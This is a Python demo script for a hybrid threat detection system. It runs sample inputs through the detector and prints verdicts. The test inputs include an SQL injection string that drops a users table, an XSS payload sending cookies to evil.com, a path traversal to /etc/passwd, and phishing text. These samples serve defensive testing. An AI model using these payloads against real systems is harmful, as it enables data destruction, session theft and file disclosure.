"""
Simple Demo - Threat Detection System
Quick demonstration without full model training
"""

from detect import HybridThreatDetector
import time

def demo_signature_detection():
    print("🛡️ Threat Detection System - Signature Detection Demo")
    print("="*60)
    
    detector = HybridThreatDetector()
    
    # Test cases with expected results
    test_cases = [
        {
            'name': 'Phishing Email',
            'data': {
                'text': 'URGENT: Your PayPal account has been suspended! Click here immediately to verify: http://paypal-security.tk/login',
                'source': 'email_test'
            }
        },
        {
            'name': 'SQL Injection Attack',
            'data': {
                'text': "'; DROP TABLE users; SELECT * FROM passwords;--",
                'source': 'web_form'
            }
        },
        {
            'name': 'XSS Attack',
            'data': {
                'text': '<script>alert("XSS Attack"); document.location="http://evil.com/steal.php?cookie="+document.cookie</script>',
                'source': 'web_input'
            }
        },
        {
            'name': 'Directory Traversal',
            'data': {
                'text': '../../../../etc/passwd',
                'source': 'file_access'
            }
        },
        {
            'name': 'Suspicious Domain',
            'data': {
                'domain': 'amazon-security-update.tk',
                'source': 'network_traffic'
            }
        },
        {
            'name': 'Legitimate Email',
            'data': {
                'text': 'Thank you for your business inquiry. We will get back to you within 24 hours.',
                'source': 'business_email'
            }
        }
    ]
    
    results = []
    
    for i, test_case in enumerate(test_cases, 1):
        print(f"\\nTest {i}: {test_case['name']}")
        print("-" * 40)
        
        start_time = time.time()
        result = detector.detect_threats(test_case['data'])
        end_time = time.time()
        
        verdict = result['final_verdict']
        
        if verdict['is_threat']:
            status = f"🚨 THREAT DETECTED"
            color = "RED"
        else:
            status = f"✅ BENIGN"
            color = "GREEN"
        
        print(f"Result: {status}")
        print(f"Confidence: {verdict['confidence']:.1%}")
        print(f"Severity: {verdict['severity']}")
        if verdict['threat_types']:
            print(f"Threat Types: {', '.join(verdict['threat_types'])}")
        print(f"Detection Time: {end_time - start_time:.3f} seconds")
        
        # Show detection methods used
        methods = []
        if verdict['signature_detected']:
            methods.append("Signature")
        if verdict['ml_detected']:
            methods.append("Machine Learning")
        if methods:
            print(f"Detection Methods: {', '.join(methods)}")
        
        results.append({
            'name': test_case['name'],
            'threat_detected': verdict['is_threat'],
            'confidence': verdict['confidence'],
            'severity': verdict['severity']
        })
    
    # Summary
    print("\\n" + "="*60)
    print("DETECTION SUMMARY")
    print("="*60)
    
    threats_detected = sum(1 for r in results if r['threat_detected'])
    print(f"Total Tests: {len(results)}")
    print(f"Threats Detected: {threats_detected}")
    print(f"Benign Items: {len(results) - threats_detected}")
    print(f"Detection Rate: {threats_detected/len(results)*100:.1f}%")
    
    print("\\nDetailed Results:")
    for result in results:
        status = "THREAT" if result['threat_detected'] else "BENIGN"
        print(f"  {result['name']}: {status} (Confidence: {result['confidence']:.1%})")
    
    # Show alerts if any
    alert_summary = detector.get_alert_summary()
    if alert_summary['total_alerts'] > 0:
        print(f"\\nAlerts Generated: {alert_summary['total_alerts']}")
        if 'severity_distribution' in alert_summary:
            print("Alert Severity Distribution:")
            for severity, count in alert_summary['severity_distribution'].items():
                print(f"  {severity}: {count}")

def demo_file_analysis():
    print("\\n" + "="*60)
    print("FILE ANALYSIS DEMO")
    print("="*60)
    
    # Create a sample suspicious file
    import pandas as pd
    
    sample_data = pd.DataFrame({
        'text_content': [
            'Dear customer, your account has been suspended. Click here to reactivate.',
            'SELECT * FROM users WHERE password = "admin"',
            '<script>alert("malicious")</script>',
            'Normal business email content about meeting tomorrow.',
            'Your bank account requires immediate verification at fake-bank.com'
        ],
        'source_ip': ['192.168.1.100', '10.0.0.5', '172.16.0.1', '8.8.8.8', '203.0.113.1'],
        'suspicious_score': [0.9, 0.8, 0.95, 0.1, 0.85]
    })
    
    sample_file = 'sample_threats.csv'
    sample_data.to_csv(sample_file, index=False)
    
    print(f"Created sample file: {sample_file}")
    print("Analyzing file...")
    
    detector = HybridThreatDetector()
    results = detector.process_file(sample_file)
    
    threats_found = sum(1 for r in results if r['final_verdict']['is_threat'])
    print(f"\\nFile Analysis Results:")
    print(f"  Total items analyzed: {len(results)}")
    print(f"  Threats detected: {threats_found}")
    print(f"  Detection rate: {threats_found/len(results)*100:.1f}%")
    
    # Clean up
    import os
    os.remove(sample_file)

def main():
    print("🛡️ THREAT DETECTION SYSTEM")
    print("Comprehensive Cybersecurity Analysis Platform")
    print()
    
    # Run signature detection demo
    demo_signature_detection()
    
    # Run file analysis demo
    demo_file_analysis()
    
    print("\\n" + "="*60)
    print("DEMO COMPLETED!")
    print("="*60)
    print("\\n✨ Key Features Demonstrated:")
    print("  ✅ Signature-based threat detection")
    print("  ✅ Pattern matching for common attacks")
    print("  ✅ Real-time confidence scoring")
    print("  ✅ Multiple threat type classification")
    print("  ✅ File processing capabilities")
    print("  ✅ Alert generation and logging")
    print()
    print("🚀 Next Steps:")
    print("  1. Run 'python main.py dashboard' for interactive web interface")
    print("  2. Add your own datasets to improve detection accuracy")
    print("  3. Train custom ML models with 'python main.py train'")
    print("  4. Customize detection rules in the 'rules/' directory")

if __name__ == "__main__":
    main()
